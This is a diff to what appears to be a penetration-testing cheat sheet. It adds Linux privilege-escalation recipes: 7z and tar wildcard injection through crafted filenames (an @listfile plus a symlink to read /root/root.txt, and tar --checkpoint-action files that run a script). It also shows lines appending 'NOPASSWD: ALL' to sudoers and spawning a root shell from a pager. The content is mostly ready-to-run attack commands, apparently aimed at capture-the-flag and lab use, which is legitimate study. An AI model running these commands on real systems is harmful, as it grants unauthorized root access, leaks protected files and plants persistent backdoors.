@@ -257,6 +257,27 @@ sqlmap -r request.txt -p <target_param> -D <DB_name> -T <TABLE_name> -C <column_
 
 # Linux Privilege Escalation
 
+## 7z
+
+### Wildcards Injection
+```bash
+# This works a privileged user executes a 7z command with wildcards like:
+7za a /backup/$filename.zip -t7z -snl -p$pass -- *
+
+# 1. Navigate to the directory where the 7z command is executed
+cd /path/to/7z/acting/folder
+
+# 2. Create a file starting with '@' to exploit 7z's list file feature
+touch @root.txt
+
+# 3. Create a symlink to the file
+ln -s /root/root.txt root.txt
+
+# 4. Wait for the 7z command to be executed by the privileged user
+# The content of @root.txt isn't a valid 7z list file, so 7z throws an error and shows the content of root.txt
+```
+> - [Wildcards Spare tricks - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z)
+
 ## Sudo
 
 ### Sudo Version
@@ -290,9 +311,8 @@ echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
 
 ### Command Forgery (NOPASSWD)
 ```bash
-# If a command can be executed as root with NOPASSWD 
-# Example `sudo -l output: `(root) NOPASSWD: /path/to/somecmd`
-# This works when there's a misconfiguration in the sudo environment
+# This works when a command can be executed as root with NOPASSWD and there's a misconfiguration in the sudo environment 
+# Example `sudo -l` output: `(root) NOPASSWD: /path/to/somecmd`
 
 # 1. Creat the same command
 cat << EOF > /tmp/somecmd
@@ -349,6 +369,33 @@ sudo systemctl status example.service
 # 2. In the pager (like less) that opens, try the following commands to spawn a root shell
 !sh
 ```
+
+## Tar
+
+### Wildcards Injection
+```bash
+# This works when a privileged user executes a tar command with wildcards like:
+tar -zcf /path/to/backup.tgz *
+
+# 1. Navigate to the directory where the tar command is executed
+cd /path/to/target/directory
+
+# 2. Create checkpoint files
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh privesc.sh'
+
+# 3. Create a bash script for privilege escalation
+cat << EOF > privesc.sh
+#!/bin/bash
+echo 'currentuser ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
+EOF
+chmod +x privesc.sh
+
+# 4. Wait for the tar command to be executed by the privileged user
+# The checkpoint files will be interpreted as tar options, executing the script
+```
+> - https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
+
 
 # Windows Privilege Escalation
 
